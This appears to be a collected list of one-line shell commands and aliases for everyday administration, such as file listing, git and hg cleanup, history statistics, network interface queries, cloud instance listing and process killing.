"ls -ahl --color | more; echo ""\e[0;30m[\e[0;32m Dirs:\e[1;36m `ls -l | egrep \""^drw\"" | wc -l` \e[0;30m|\e[1;33m Files: \e[0;31m`ls -l | egrep -v \""^drw\"" | grep -v total | wc -l` \e[0;30m]"""
"ls -ahl --color | less; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -ahl $CM_CONF_LS_DIRGROUP $CM_CONF_LS_COLOR | more $CM_CONF_MORE_COLOR; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -ahl $1 | more; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al $1 | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -ah --color | more; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"log --limit 20 --template ""{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n"" "
"ifconfig |egrep -o ""venet...|lo|eth[^ ]*|ppp|:(.{1,3}\.){3}.{1,3}""|grep -v 255|uniq"
"ifconfig | grep UP -A1 | sed 's/flags.*$//g' | tr '\n' ' ' | sed 's/-- /\n/g'| sed 's/ inet/\t=/' | sed 's/lo:/lo:\t/' | grep --color -E '= ([0-9]{1,3}[\.]){3}[0-9]{1,3}' ; echo "
"ifconfig | grep -e ""inet "" | tr ""\n"" ""+"" | sed ""s/^.*inet//g"" | sed ""s/[netmask|broadcast|0xfffff000]//g"" | sed ""s/\+//g"""
"hwinfo --netcard --wlan --bluetooth | grep -Ei ""model\:|driver\:|status\:|cmd\:|file\:|detected\:"" | grep -v ""Config Status"""
"hwinfo --netcard --wlan --bluetooth | grep -Ei ""model\:|driver\:|status\:|cmd\:|file:|detected\:"" | grep -v ""Config Status"" "
"history |tr ""\011"" "" "" |tr -s "" ""| cut -d"" "" -f3 |sort |uniq -c |sort -nbr |head -n10"
"history | tr -s ' ' | cut -d ' ' -f3 | sort | uniq -c | sort -n | tail | perl -lane 'print \$F[1], \"
"history | tail -2 | head -1 | sed s/\ // | sed s/\ // | sed s/^[[:digit:]]*\ //g | sed s/\(.*\)/\""$\""/g | xargs /home/kulwant/Desktop/ctrl-z.sh"
"history | grep ""git "" | grep -v history | sed ""s/ *//"" | cut -d"" "" -f 4 | sort | uniq -c | sort -n"
"history | awk '{print $2}' | awk 'BEGIN {FS=""|""}{print $1}' | sort | uniq -c | sort -nr | head"
"history | awk ""{print $2}"" | awk ""BEGIN {FS=\""|\""} {print $1}"" |sort|uniq -c | sort -rn | head -10"
"history | awk ""{print $2}"" | awk ""BEGIN {FS=""|""} {print $1}"" |sort|uniq -c | sort -rn | head -10"
"hg st | grep ""?"" | egrep ""\.cpp$|\.h$|\.m$|\.hpp|Makefile"" | grep -v Makefile.conf"
"hg log --template ""{node|short} | {date|age} | {author|person}: {desc|strip|firstline}\n"""
"hg log --limit 30 --template ""{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n"""
"hg log --limit 20 --template ""{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n"" "
"hg heads --template ""{branch}|{rev}:{node|short}|{date|age}|{author|person}\n"" | \
"hg glog --template ""{node|short} | {date|age} | {author|person}: {desc|strip|firstline}\n"""
"gud && git branch --remotes --merged | grep origin | sed ""s,.*origin/,,""| grep -vE ""^($(git_current_branch)|master|develop|dev)\s*$"" | xargs -n 1 git push --delete origin"
"grep -r -n ""\!*"" err.txt generated.file succ.txt |\grep -v Binary |\grep -v text-base |\grep -v .svn |\grep -v ""\.o:"" |\grep -v ""\.d:"" |\grep -v ""\.a:"" |\grep -v ""\.swp:"""
"grep -iP ""(?>(?>([a-f0-9]{1,4})(?>:(?1)){7}|(?!(?:.*[a-f0-9](?>:|$)){8,})((?1)(?>:(?1)){0,6})?::(?2)?)|(?>(?>(?1)(?>:(?1)){5}:|(?!(?:.*[a-f0-9]:){6,})(?3)?::(?>((?1)(?>:(?1)){0,4}):)?)(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(?>\.(?4)){3}))"""
"grep -E -o ""[0-9a-zA-Z-]+\.[0-9a-zA-Z-]+\.[0-9]+"" ~/Dropbox/Apps/neutriNote/bib/Aspiro_1.8.bib | sort | uniq > ~/.vim/keywords.txt && rg -oN --no-filename ""\{\#[^\d|\#|}]+\}"" ~/Dropbox/Apps/neutriNote/Aspiro/dis_4.0/* | sed s/#// | sort | uniq > ~/.vim/references.txt"
"grep ""^Updating"" | sed ""s/Updating //"" | xargs git log --oneline | grep ""Merge pull request"" | awk ""{print $1;}"" | xargs git show -s --format=%B | grep -v -e ""^$"" | grep -v ""Merge pull request"""
"git status | grep -v ""LC"" | grep -v ""pk"" | grep -v ""languagesw"" | grep -v ""jsgz"" | grep -v ""cssgz"" |grep -v ""locale""| grep modified "
"git ls-files | xargs -I {} echo 'git blame {} ' | awk '{print \$2,\$3}' | sort | uniq -c | sort -n -k 1 -r | head -n 1 ' | bash"
"git ls-files | grep -vE ""^(colors|snippets|doc)/"" | xargs -I{} cat ""{}"" | grep -vE ""^$|^\s*\"""" | wc -l"
"git log --pretty=format: --name-only --since=""last year"" | sort | uniq -c | sort -rg | grep -v Gemfile | grep -v ""config/"" | grep -v "".gemspec"" | head -50"
"git lab merge-request $(git branch | grep ""^*"" | cut -d "" "" -f 2):$(git remote show origin -n | grep `git branch | grep ""^*"" | cut -d "" "" -f 2` | grep ""merges with remote"" | sed ""s/.* \([-a-z]*\)$/\1/"")"
"git branch --merged | grep -v develop | grep -v master | sed -e ""s| ||g"" | while read ln; do git branch -d ""$ln"" ; done"
"git branch --merged | grep -v ""\*"" | grep -v master | grep -v develop | grep -v testflight | grep -v staging | grep -v production | xargs -n 1 git branch -d"
"git branch --merged master | grep -vE ""^\*|master$|stress|devintegrate|staging|production$"" | xargs -I % git branch -d %"
"git branch --all | sed ""s/remotes\/origin\///"" | egrep -v -e ""->"" -e ""$(git rev-parse --abbrev-ref HEAD --)"" | sort | uniq | fzf | cut -c 3- | xargs -r git checkout"
"find mason -iregex "".*\\(.m\\|.mi\\|\\.js\\|html\\|dhandler\\|autohandler\\)"" -print | grep -v ""#"" | etags -"
"find /media/WinD -maxdepth 4 -type f -iregex "".*\.\(aac\|flac\|mp3\|ogg\|wav\|m4a\|ape\)$"" | sort > playlist"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(so|o|lo|a|ar)$"" |xargs -0 nm -CA 2>/dev/null | grep -a --color=$COLOR_FLAG"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(ini|cfg|conf|xml|json|yaml)$"" | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -regextype ""egrep"" -regex "".*\.(h|hh|inc|c|cc|cxx|cpp)$"" -print0 | xargs -0 grep"
"find -type f -iregex "".*\.\(mp3\|wmv\|mp4\|mkv\|flac\|avi\|iso\|vob\)$"" -exec mplayer -cache 1000 {} +"
"expac -l ',' -H M -t '%s %c' '(%N) [%G] %l\t%m\t%n\t' | grep '()' | grep -v '\[base\|base-devel\]' | cut -d' ' -f3- | awk -v old=\$(date --date='2 weeks ago 00:00' +%s) '\$1>old' | sort -n | cut -d' ' -f2-"
"env | egrep -i ""JAVA_HOME|RELEASE|WL_HOME|ANT_HOME|MW_HOME|JAVA_OPT|ANT_OPT"" && checkpath $PATH && checkpath $CLASSPATH "
"egrep -v ""nbproject|~\$|Thumbs.db|\.marks$|^\.#|^#.*#\$|\.swp|\.bak\$"""
"echo -n `cat ~/.zsh/zhistory | sed ""s/sudo //"" | grep -Eo ""^[^ ]+"" | sort | uniq -c | sort -rn | head` | sed -e ""s/\([a-z+]\) \([0-9]\)/\1; \2/g"""
"echo -e 'tmux new -s session_name | tmux attach -t session_name | tmux ls | tmux detach (prefix+d)\ntmux new-window (prefix+c) | tmux select-window -t 0-9 (prefix + #) | tmux rename-window (prefix+,) | tmux split-window -h\ntmux list-keys | tmux info ' "
"echo ""make sure the egrep takes into account checkout AND co ; make sure history works, even if we have some weird histvars or so for history (if it displays dates,...)""; #checkout $( history | egrep ""^[ ]*[0-9]*[ ]*(checkout|co) [ ]*([A-Za-z]|-b)"" | sed ""s/^[ ]*[0-9]*[ ]*checkout *\(-b\)* *//g"" | sed ""s/\""//g"" | grep -v `rev-parse --abbrev-ref HEAD` | tail -1) #checkout the last branch checked-out before the current"
"echo ""Dir Size|Perms|Link Count|Owner|Group|Size|Mod. Time|Name""; ls -AFhls --color --group-directories-first"
"echo ""---------------------------------"" && cat config/env/joe.js | grep apiWorkplace -A 1 | tail -1 | tr -d ""[:space:]"" | cut -c 14- | rev | cut -c 3- | rev && echo ""---------------------------------"""
"dump.py|awk ""{print $2,$4}""|rg https://|sed ""s,https://,,""|fzf|cut -d"" "" -f2|tr -d ""\n""|xsel -ib"
"du -akx --time / |egrep ""J2EE|boot|home|var|dev"" |sort -nru |head -30"
"df -h|grep -v none|grep -Ev ""(udev|cgmfs|shm|cgroup|run|tmpfs)"""
"date;l_pwd=`pwd`;cd /{root}/{DEVISON}/ER/{SUBSTREAM}/build/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/build1/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/build2/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/stage/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/log/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/badfiles/; echo ""`pwd` : `ls | wc -l`"";cd /{root}/{DEVISON}/ER/{SUBSTREAM}/darchive/; echo ""`pwd` : `ls | wc -l`""; cd $l_pwd"
"date --help|sed -n ""/^ *%%/,/^ *%Z/p""|while read l;do date +\ %${l/% */}:\|"" |${l/% */}|${l#* }"";done|column -s""|"" -t"
"cvs up 2>&1 | grep --color ""U \|P \|A \|R \|M \|C \|? """
"curl xkcd.com | grep hotlinking | awk {print\ \$5} | sed ""s/<\/h3>//"" > tmp.o && curl `cat tmp.o` > tmp.png || rm tmp.o && feh tmp.png || rm tmp.png"
"curl -s localhost:8001/consumers|jq -r "".data[] | [.id, .username] | @tsv"" | while read -e id name; do printf ""%-40s %-45s "" $id $name ; curl -s localhost:8001/consumers/$id/key-auth|jq -r "".data[] | .key ""|paste -s -d"" "";done"
"curl -s localhost:8001/consumers|jq -r "".data[] | [.id, .username] | @tsv"" | while read -e id name; do printf ""%-40s %-45s "" $id $name ; curl -s localhost:8001/consumers/$id/acls|jq -r "".data[] | .group""|paste -s -d"" ""; done"
"condor_q -nobatch | grep -v "" X "" | head; echo ...; condor_q -nobatch | grep -v 0+00:00:00 | tail; printf ""Started but idle jobs : ""; condor_q -nobatch | grep -v 0+00:00:00 | grep "" I "" | wc -l;"
"clear; echo ""# TOP 15 HEADLINES FROM SVD.SE :""; echo ""=================================""; wget --output-document - --quiet svd.se | grep ""h2 class=\""Teaser-heading"" | cut -d "">"" -f2 | cut -d ""<"" -f1 | head -n30 | sort -u | uniq | lolcat"
"cd ~/code/promote3 && xsel > errbit_error.txt && vim errbit_error.txt -c ""%s/\v^(.*gems.*gems\/)?([^(-)]*-\d\.)/bunlinks\/\2/e | %s/\v^([^(bunlinks|\/opt)].)/\1/e | %s/\v^\/opt\/promote\/releases\/\d+T\d+\///e | w | set errorformat=%f:%l%m | cbuffer | copen"" && rm errbit_error.txt"
"cd $GOPATH/src && cd $(find . -type d -maxdepth 3 | sed ""s|./||"" | fzf || echo -) > /dev/null"
"cat package.json | ack --no-color ""\""((mad-logs)|(mad-utils)|(@ottawamhealth\/[a-zA-Z-_$]+)|(kidnap-console)|(env-var-helpers)|(errorcatcher)|(common-constants))\"""":"
"c++_tmpl_filt_ | c++_tmpl_filt_ | c++_tmpl_filt_ | c++_tmpl_filt_ | c++_tmpl_filt_ | c++_tmpl_filt_ | c++_tmpl_filt_ | sed ""s/{}/<>/g"""
"aws ec2 describe-instances | jq -r "".Reservations[].Instances[] | select(.State.Name == \""stopped\"") | select(.Tags!=null) | [.InstanceId, .PublicIpAddress, .PrivateIpAddress, [.Tags[] | select(.Key == \""Name\"").Value][]] | @tsv "" | sort -k3"
"aws ec2 describe-instances | jq -r "".Reservations[].Instances[] | select(.State.Name == \""running\"") | select(.Tags!=null) | [.InstanceId, .PublicIpAddress, .PrivateIpAddress, [.Tags[] | select(.Key == \""Name\"").Value][]] | @tsv "" | sort -k3"
"aws ec2 describe-instances --query 'Reservations[].Instances[].join(\`,\`, [@.InstanceId, @.Tags[?Key==\`Name\`].Value | [0] || \`\`, @.NetworkInterfaces[].PrivateIpAddresses[].PrivateIpAddress | [0] || \`\`])' | jq -r .[]"
"array=( $(fd ""[0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]?[0-9]?[0-9]?[0-9]?\.(png|jpeg|jpg|JPG|jpeg|JPEG|JPE|PNG)$"") ); mvi ""${array[@]}"""
"apt-get purge \$(dpkg --list |egrep 'linux-image-[0-9]' |awk '{print \$3,\$2}' |sort -nr |tail -n +2 |grep -v \$(uname -r) |awk '{print \$2}' |tr '[:space:]' ' ')"
"adb logcat -c; adb logcat -v color | egrep --line-buffered -v ""(qmi_client|fpce_|slim_daemon|sensorservice|NuPlayer|AtCmdFwd|MediaPlayer)"""
"\git config remote.origin.url | \sed -E ""s|^git@|https://|;s|(\.\w+):|\1/|"""
"TMP_STATUS=$?; termux-notification --led-color ""$([ ""$TMP_STATUS"" = ""0"" ] && echo 009900 || echo 990000)"" --title ""$([ ""$TMP_STATUS"" = ""0"" ] && echo Finished successfully! || echo Failed!)"" --content ""$(tail -n1 $HISTFILE | sed ""s/[: 0-9]*;//"" | sed ""s/[|&;]* *alert//"")"""
"(set -o pipefail && git describe --long 2>/dev/null | sed ""s/\([^-]*-g\)/r\1/;s/-/./g;s/^[A-Za-z]*\.//"" || printf ""r%s.%s\n"" ""$(git rev-list --count HEAD)"" ""$(git rev-parse --short HEAD)"") 2>/dev/null | awk ""NR>1{print PREV} {PREV=\$0} END{printf(\""%s\"",\$0)}"" | sed ""/^r\.$/d;s/^[A-Za-z]*\.//"" | tee >(xclip -i -selection clipboard) >&2 | grep -q ""."""
"$(which find) $(echo $PATH | tr : ""\n"" | \egrep ""/(s?bin|shl|py|rb|pl)"") /system/{bin,xbin} 2>/dev/null | egrep"
"$'wget -q https://raw.githubusercontent.com/30-seconds/30-seconds-of-code/master/README.md -O - | awk -vn=$(shuf -i 14-360 -n 1) \'/###/ {i++;k=1}; i==n && k==1 {print}; /<\/details>/ {k=0}\' | awk \'$0 !~ ""```|details""\' | sed \""s/<summary.*$Examples/Examples:/g\"" | sed \""s/### //g\"" | sed \""s/\`//g\"" | head -n-1'"
""function|defined|rejection|SyntaxError|TypeError|ReferenceError|UnhandledPromiseRejectionWarning|TimeoutError"" \
" grep -iP ""(?>(?>([a-f0-9]{1,4})(?>:(?1)){7}|(?!(?:.*[a-f0-9](?>:|$)){8,})((?1)(?>:(?1)){0,6})?::(?2)?)|(?>(?>(?1)(?>:(?1)){5}:|(?!(?:.*[a-f0-9]:){6,})(?3)?::(?>((?1)(?>:(?1)){0,4}):)?)?(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(?>\.(?4)){3}))"""
{ $adb shell getprop dhcp.${androidWlanInterface/:*/}.ipaddress | \grep [0-9] || $adb shell ip -o addr show $androidWlanInterface | awk -F ' *|/' '/inet /{print\$4}'; } | $dos2unix
xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s
xinput enable $(xinput list | grep 'DualPoint Stick' | cut -d '=' -f2 | cut -d '[' -f1) && xinput enable $(xinput list | grep 'DualPoint TouchPad' | cut -d '=' -f2 | cut -d '[' -f1)
xinput disable $(xinput list | grep 'DualPoint Stick' | cut -d '=' -f2 | cut -d '[' -f1) && xinput disable $(xinput list | grep 'DualPoint TouchPad' | cut -d '=' -f2 | cut -d '[' -f1)
xdg-open \`git remote -v | grep git@github.com | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/:/\//' -e 's/git@/http:\/\//'\` &>/dev/null
xdg-open \`git remote -v | grep git@github.com | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/:/\//' -e 's/git@/http:\/\//'\`
xdg-open \`git remote -v | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/git@/http:\/\//' -e's/\.git$//' | sed -E 's/(\/\/[^:]*):/\1\//'\`
while true; do clear ; tree -a -I 'generation|bin|build|__pycache__|node_modules|.git|*.swp' ; sleep 5 ; done
w | grep -v '^USER' | sed 's/ .*//' | sort | uniq | xargs finger | grep Name
vim src/**/*.(js|ts|vue|json) *.(js|json|ts) test*/**/*.(js|ts)
upower -i `upower -e | grep battery` | grep -E 'battery|state|time to empty|percentage|capacity'
upower -i \$(upower -e | grep -i bat) | grep -E 'state|to\ full|percentage' && upower -i \$(upower -e | grep -i line) | grep online
tree -aC -I '.DS_Store|._*|Thumbs.db|.git|.svn|node_modules|bower_components' --dirsfirst
tree -I '*.pyc|*.un~|*.sw[op]|*node_modules*|%*|.DS_Store|.git' -Ca
tree -C -I 'target|node_modules|dist|vendor|deps|_build|cover'
tree -AF -I '.DS_Store|._*|Thumbs.db|.git|.svn|node_modules|bower_components' --dirsfirst $@
task +ACTIVE -COMPLETED -subtask project.is:shoebox export | jq -r '.[].description' | cut -d'|' -f 1 | head -n 1 | tr -d '\n' | tr -d ' ' 2> /dev/null
task +ACTIVE -COMPLETED +subtask project.is:shoebox export | jq -r '.[].description' | cut -d'|' -f 1 | head -n 1 | tr -d '\n' | tr -d ' ' 2> /dev/null
svn st | grep -E '^( ?M|A|D|!|~|\?)'
svn st | grep '^\?' | awk '{print \$2}' | xargs svn add && svn st | grep '^\!' | awk '{print \$2}' | xargs svn rm
sudo route add 10.8.68.166 dev tun0 || sudo route add 10.8.76.24 dev tun0 || sudo route add 10.8.40.111 dev tun0 || sudo route add 10.8.44.90 dev tun0
sudo off-pos || off-mar || off-mo || echo 'stoped'
sudo find . -type d -print0 | xargs -0 du -s | sort -n | tail -10 | cut -f2 | xargs -I{} du -sh {} | sort -rn
source .venv/bin/activate||source .env/bin/activate||source env/bin/activate||source venv/bin/activate
service mysql restart||service mariadb restart||/etc/init.d/mysqld restart||/etc/init.d/mysql restart
sensors | grep -vi virtu && bat | grep rate | grep -v His && bat | grep time && bat | grep percent && bat | grep state
sed -e 's|^|/* |g' -e 's|$| */|g'
sed -e 's|^[^/]*//||' -e 's|/.*$||'
sed '/^#/d' ~/.bash_history | awk '{print \$1}' | sort | uniq -c | sort -nr | head -20 | cat -n
sbsubmit -no-clickable-shell -skip toptesters -skip indent -skip sbedits -cn \$(p4 opened|grep ' change '|sed -re 's/.* change ([0-9]+).*/\1/g'|sort|uniq|xargs p4 changelist -o|sed -nre '/^Change:/ { s/Change:.([0-9]+).*/\1/gp }')
qbuild -l build1.log sound dev || build -l build2.log sound dev || crash -l build3.log sound dev || build -l build4.log sound clean dev
pwd;find . | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g' | less
pushd +\$(dirs -p -v -l | sort -k 2 -k 1n | uniq -f 1 | sort -n | peco | head -n 1 | awk '{print \$1}')
ps aux | grep ruby | cut -d' ' -f5 | xargs kill -9; ps aux | grep sidekiq | cut -d' ' -f5 | xargs kill -9; spring stop
ps aux | grep node | grep -v Postman | grep -v Skype | grep -v Slack | grep -v WebStorm | grep -v grep
ps aux | grep intellij\.android\.jps | grep -v grep | fzf | tr -s ' ' | cut -d' ' -f 2 | xargs -r kill
ps aux | grep as-releases | grep -v grep | fzf | tr -s ' ' | cut -d' ' -f 2 | xargs -r kill -9
ps aux | grep -v grep | grep com.huawei.gocd | sed 's/-D.* //g' | sed 's/-cp .*.jar//g' | sed 's/\/Library\/.*java//g' | cat -n
ps aux | ack rails | ack -v '3001' | awk '{print \$2}' | xargs kill -9; ps aux | ack rails | ack -v '3001'; bundle exec rails server
ps aux | ack rails | ack -v '3001' | awk '{print \$2}' | xargs kill -9; ps aux | ack rails | ack -v '3001'
ps aux | ack 'npm\|node\|gulp\|nodemon' | awk '{print \$2}' | sudo xargs kill -9
ps -ef | grep exp; ps -ef | grep qemu; ps -ef |grep kernel; ps -ef |grep dstat; netstat -tunlp | grep 5555; ps -ef |grep 5555
ps -ef | grep -v grep | grep rdagent | grep ${LOGNAME}; ps -ef | grep -v grep | grep nginx | grep ${LOGNAME}
pip3 install --upgrade pip; pip install --upgrade pip; pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U; pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U; rm -rf ~/Library/Caches/pip
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install --user -U; pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2 install --user -U
pbpaste | sed 's/|//g' | sed 's/^ *//' | sed 's/ *$//' | sed 's/ */ /g' | grep -v
pacman -Qq | awk '/^.+(-cvs|-svn|-git|-hg|-bzr|-darcs)$/'
pacman -Qi | egrep '^(Name|Installed)' | cut -f2 -d':' | tr '\nK' ' \n' | sort -nrk 2 | less
p4 opened|grep ' change '|sed -re 's/.* change ([0-9]+).*/\1/g'|sort|uniq|xargs p4 describe|sed -nre '/^g[0-9]+/ { s/(g[0-9]+).*/\1/gp }'
p4 opened|grep ' change '|sed -re 's/.* change ([0-9]+).*/\1/g'|sort|uniq|xargs p4 changelist -o|sed -nre '/^Change:/ { s/Change:.([0-9]+).*/\1/gp }'
p java | g -v IntelliJ | g -v Twist | g -v Yourkit | g -v grep | cut -b 10-16 | xargs kill
open \`git remote -v | grep github.com | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e 's/git@/http:\/\//'\`
open \`git remote -v | grep git@github.com | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/:/\//' -e 's/git@/http:\/\//'\`
open \`git remote -v | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/git@/http:\/\//' -e's/\.git$//' | sed -E 's/(\/\/[^:]*):/\1\//'\`
open \$(echo https://bitbucket.org/\$(git remote -v | head -1 | perl -p -e 's|.*:([^ ]+).*|\1|' | sed 's/\.git$//')/pull-requests/new?source=\$(git current-branch))
open -a '/Applications/Google Chrome.app' \`git remote -v | grep git@github.com | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/:/\//' -e 's/git@/http:\/\//'\`
open $(git remote -v | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e 's/ssh:\/\///' -e's/git@/http:\/\//' -e's/\.git\$//' | sed -E 's/(\/\/[^:]*):/\1\//')
nosetests -s -w $VIRTUAL_ENV --all-modules --with-id -i '^(it|ensure|must|should|deve|garante|assegura)' --id-file='$VIRTUAL_ENV/.noseids' -v
netstat -plan|grep :80|awk {'print $5'}|cut -d: -f 1|sort|uniq -c|sort -nk 1
netstat -ntu | tail -n +3 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
netstat -na|awk '\$5 ~ /[0-9]+:[0-9]+/ {print \$5}' |awk -F ':' -- '{print \$1}' |sort -n|uniq -c |sort -rn|tail -n 15
netstat -nat | awk '{print $5}' | awk -F ':' '{print $1}' | sort | uniq -c | sort -rn | head -n 10
netstat -anp |grep 'tcp\|udp' | awk '{print }' | cut -d: -f1 | sort | uniq -c
netstat -anp | grep tcp | awk '{print $5}' | cut -f 1 -d : | sort | uniq -c | sort -n
mp --shuffle --no-audio-display **/*.(aac|mp3|ogg|oga|midi|wma|flac)
ls || alias ls=l || alias ll='ls -l' ||alias 'ls -l'=ll \n
ls -d -t ~/tmp/* | grep .*diff | head -n 1;ls -d -t ~/tmp/* | grep .*diff | head -n 1 | xargs cat | hg patch --no-commit -
ls -d -1 ~/.vim/bundle/* | xargs -I{} git -C {} remote -v | sed 's/^origin//' | sed 's/(fetch)*$//' | sed 's/(push)*$//' | uniq | sed 's/^[ \t ]*//;s/[ \t ]*$//' > vim-plugins
ls -Hlrtd !(*.r|*.R|*.Rmd|*.sh|*.nf|*.py) | egrep -v ^d
ls -Hlrt *.@(r|R|rmd|Rmd|sh|nf|py)
ls -F **/*.* | cut -d '.' -f 2- | sed 's/.\+\.//' | sed 's/\*$//' | sed 's/.*\/$//' | sed 's/.*:$//' | grep -v '^$'
locate / | fzf --preview '(highlight -O ansi -l {} 2> /dev/null || cat {} || tree -C {}) 2> /dev/null | head -200'
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.status.reason!=null) | select(.status.reason | contains('Evicted')) | 'kubectl delete pods \(.metadata.name) -n \(.metadata.namespace)'' | xargs -n 1 bash -c
kubectl get nodes --no-headers | grep Ready | grep node | awk '{print \$1}' | xargs -I {} sh -c 'echo {}; kubectl describe node {} | grep Allocated -A 5 | grep -ve Event -ve Allocated -ve percent -ve -- ; echo'
kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}') | grep token: | sed s/token:// | sed 's/ //g' | pbcopy
killall -9 python || killall -9 roslaunch || killall -9 gzserver || killall -9 gzclient
kill -9 $(nvidia-smi | grep python | sed -n 's/|\s*[0-9]*\s*\([0-9]*\)\s*.*/\1/p' | sort | uniq | sed '/^$/d')
jq '.[] | .[] | .Instances | .[] | .NetworkInterfaces | .[] | .PrivateIpAddress'
ipconfig getpacket en0 | grep domain_name_server | cut -d ':' -f 2 | sed 's/{//g'| sed 's/}//g' | sed 's/^[ \t]*//g' | sed 's/[ \t]*$//g'
ifconfig en0 | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' | head -1
hoo|tail +3|guniq -w 9|cut -c11-22|sort|uniq -c|sort -nr
history|sed -e 's/sudo //g'|awk '{ print $2 }'|sort|uniq -c|sort -r|head
history | tr -s ' ' | cut -f 3- -d ' ' | sort | uniq -c |sort -nr | head
history | tr -s ' ' | cut -d ' ' -f 5 | sort | uniq -c | sort -nr | head
history | tr -s ' ' | cut -d ' ' -f 3 | sort | uniq -c | sort -nr | head -20
history | cut -c8- | cut -d' ' -f1 | sort | uniq -c | sort -nr | head
history | cut -c 8- | grep git | sort | uniq -c | sort -n -r | head -n 5
history | cut -c 8- | grep git | sort | uniq -c | sort -n -r | head -n 10
history | cut -c 8- | grep ga | sort | uniq -c | sort -n -r | head -n 10
history -99999 | gtr -s ' ' | gcut -d' ' -f3- | gsort | guniq -c | gsort -rn | ghead -20
heroku apps --all | tail -n+2 | grep . | sed 's/ .*$//' | fzf --header='Select the app whose name you want to copy' | tr -d '\n' | pbcopy
grep -v '/assets/' | grep -v 'favicon.ico' | grep -v '/vendor' | grep -v '/cookie' | grep -v '/fonts' | grep -v '/apple' | grep -v '/static'
grep -iE '(err:|error|fatal|AVC)' /var/log/audit/audit.log /var/log/pulp/*log /var/log/tomcat6/catalina.out /var/log/httpd/*log /var/log/katello/katello-configure/*log /var/log/katello/*log | grep -viE '(msgid|msgstr|resteasy)'
grep -iE '(avi|flv|mkv|wmv|mpg|mpeg|mp4)'
grep '@due' $MARKDO_ROOT/* | grep '\[\s\]' | colorline | reorder | sort -r | tail -n 10 | for_each_line print_line
go list -e ./... | grep -v -E '/vendor|/integration|node_modules|/dist|/release' | xargs go test -cover
git status --porcelain | grep UU | cut -f 2 -d ' ' | xargs -o $EDITOR && git status --porcelain | grep UU | cut -f 2 -d ' ' | xargs git add
git st | grep '##' | awk '{print \$2}' | awk -F'feature/' '{print \$2}' | awk -F'.' '{print \$1}' | tr -d '\\n'| pbcopy
git st | grep '##' | awk '{print \$2}' | awk -F'bugfix/' '{print \$2}' | awk -F'.' '{print \$1}' | tr -d '\\n'| pbcopy
git remote -v | grep fetch | sed 's/origin//' | tr ':' '/' | sed 's/.*git@/http:\/\//' | sed 's/.git *([a-z]*)//' | head -n 1
git reflog --pretty='format:%C(yellow)%h|%C(green)%gD|%C(bold blue)%an|%C(red)%d%C(reset) %gs' $* | column -t -s '|' | less -FXRS
git pull || bundle || dbm || dbtp
git merge --abort 2> /dev/null || git rebase --abort 2> /dev/null || git cherry-pick --abort 2> /dev/null || git am --abort
git ls-tree --name-only -r HEAD | grep -E '\.($GITMASK)$' | xargs -n1 git blame --line-porcelain | grep '^author '|sort|uniq -c|sort -nr
git log --pretty=oneline | head -20 | tac | sed -e 's|\([a-z0-9]*\) \(.*\)|* [\1/${PWD##*/}]\n err.txt generated.file succ.txt \2\n|'
git log --pretty=format:'%C(yellow)%h|%Cred%ad|%Cblue%an|%Cgreen%d %Creset%s' --date=short | column -ts'|' | less -rX
git log --pretty=format:'%C(yellow)%h|%Cred%ad|%Cblue%an|%Cgreen%d %Creset%s' --date=short | column -ts'|' | less -r
